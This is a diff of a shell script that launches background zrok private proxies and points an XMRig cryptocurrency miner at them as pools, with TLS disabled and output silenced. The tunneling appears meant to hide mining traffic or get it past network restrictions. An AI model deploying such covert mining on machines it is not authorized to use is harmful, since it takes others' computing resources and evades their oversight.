@@ -13,13 +13,17 @@ for ip in $BIND_IPS; do
     nohup ./zrok access private proxy1 --bind "$ip:9999" --headless > /dev/null 2>&1 &
 done
 sleep 5
-XMRIG_CMD="./xmrig-x86_64-static"
 
-for ip in $BIND_IPS; do
-    XMRIG_CMD="$XMRIG_CMD -o $ip:9999 -u $WALLET -p worker_$RANDOM"
+XMRIG_CMD="./xmrig-x86_64-static -c config.json --tls false"
+
+# Append each IP from your gist as a pool
+for ip in "${BIND_IPS[@]}"; do
+    # Explicitly tell XMRig this pool is NOT tls
+    XMRIG_CMD="$XMRIG_CMD -o $ip:9999 --tls false"
 done
 
-XMRIG_CMD="$XMRIG_CMD --donate-level 1 --tls false --keepalive true --nicehash true -t 4"
-
-echo "Started"
-$XMRIG_CMD 
+# 7. Start XMRig in FOREGROUND
+echo "-------------------------------------------------------"
+echo "Launching XMRig with ${#BIND_IPS[@]} local bridges (TLS DISABLED)"
+echo "-------------------------------------------------------"
+$XMRIG_CMD
